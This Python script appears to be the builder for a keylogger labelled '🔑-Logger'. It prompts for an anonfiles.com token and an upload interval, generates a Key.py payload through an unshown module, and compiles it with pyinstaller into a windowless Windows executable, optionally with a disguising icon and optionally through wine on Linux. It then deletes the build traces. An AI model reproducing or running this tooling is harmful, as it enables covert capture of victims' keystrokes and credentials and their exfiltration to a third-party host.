# -*- coding: utf-8 -*-
# TODO Author: Abdulrahman Mohammed (De3vil)
# TODO Don't touch my code, it's art 
#+==============================
from Utils.generator import build_t
from Utils.banne_r import banner ,G,R,B,X,Q,WI , Y , BOOLD , F,res,bl
from shutil import rmtree
import os
from subprocess import call
from os import system , name , remove
if name =="nt":
	system("cls")
else:
	system("clear")
print(banner)
class EngyRun:
	def __init__(self):
		self.filenampackeg = "Key.py"
	def enjoy_my_art(self,token,time_interval):
		build_t(self.token,self.time_interval)
	def rem_ove(self):
		global filenampackeg
		try:
			self.file 	 = self.filenampackeg.split(".")[-2]
			self.spfile  = self.file+".spec"
			self.rm_fl 	 = remove(self.filenampackeg)
			self.rm_fl 	 = remove(self.spfile)
			rmtree("__pycache__", ignore_errors=True)
			rmtree("build", ignore_errors=True)
		except Exception as e:
			print(e)
	def CompilinG(self,title_ico="CompilinG Start"):
		print(X+"║")
		print(X+"╚══["+R+"🔑-Logger"+X+"]──["+R+"~"+X+"]─["+R+title_ico+X+"] "+WI)
		system(f"pyinstaller --onefile --noconsole {self.filenampackeg}")
		self.rem_ove()
		system("cls")
	def CompilinG_icon(self):
		self.icon = self.colored_input(X+f"Set Your icon File",spaces=12)
		system(f"pyinstaller --onefile --noconsole --icon={self.icon} {self.filenampackeg}")
		self.rem_ove()					 		  
	def CompilinG_Linux(self):
		pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
		compile_command = ["wine", pyinstaller_path, "--onefile", "--noconsole", self.filenampackeg]
		call(compile_command)
		self.rem_ove()
		system("clear")
	def CompilinG_Linux_icon(self):
			pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
			compile_command = ["wine", pyinstaller_path, "--onefile", "--noconsole" ,"--icon="+str(self.icon), self.filenampackeg]
			call(compile_command)
			self.rem_ove()
			system("clear")			   
	def colored_input(self,title="menu",spaces=3):
		self.spaces = " "*spaces
		print(G+self.spaces+"║")
		line = G+self.spaces+"╚══["+Y+"🔑-Logger"+G+"]──["+R+"~"+G+"]─["+B+title+G+"]"+X+":"+WI
		try:
			return input(line)
		except KeyboardInterrupt:
			exit(0)
	def packing(self):
		self.compiling = self.colored_input(X+f"{B}compiling {WI}({X}Py{WI}) {B}TO {WI}({X}ExE{WI}) {WI}({X}Y {WI}&& {R}N{WI}){WI}",spaces=8)
		if self.compiling == "y" or self.compiling == "Y":
			self.ico = self.colored_input(X+f"{B}You want set {X}icon ? {WI}({X}Y {WI}&& {R}N{WI}){WI}",spaces=12)
			if self.ico == "y" or self.ico == "Y":
				self.CompilinG_icon()
			else:
				self.CompilinG()
		else:
			pass
			system("cls")	
		if self.compiling == "n" or self.compiling == "N":
			exit(0)
		else:
			exit(0)
	def packing_linux(self):
		self.compiling = self.colored_input(X+f"{B}compiling {WI}({X}Py{WI}) {B}file to {WI}({X}ExE{WI}) {WI}({X}Y {WI}&& {R}N{WI}){WI}",spaces=12)
		if self.compiling == "y" or self.compiling == "Y":
			self.ico = self.colored_input(X+f"{B}You want set {X}icon ? {WI}({X}Y {WI}&& {R}N{WI}){WI}",spaces=12)
			if self.ico == "y" or self.ico == "Y":
				self.CompilinG_Linux_icon()
			else:
				self.CompilinG_Linux()
		else:
			system("clear")
			merry()
			self.choose()	
		if self.compiling == "n" or self.compiling == "N":
			self.CompilinG_Linux()
		else:
			exit(0)
	def choose(self,spaces0=3,spaces1=7):
		spaces0 = " " *spaces0
		spaces1 = " " *spaces1
		try:
			self.token = self.colored_input(f"{BOOLD}{F}https://anonfiles.com{res}{bl}:{X}Token :",spaces=4)
			self.time_interval = self.colored_input(f"{BOOLD}{F}in minutes{res}{bl}:{X}Time :",spaces=4)
			self.enjoy_my_art(self.token,self.time_interval)
			self.choose_compiling()
		except Exception as e:
			print(e)
	def choose_compiling(self):
		if name == "nt":
			self.packing()
		else:
			self.packing_linux()
x=EngyRun()
x.choose()

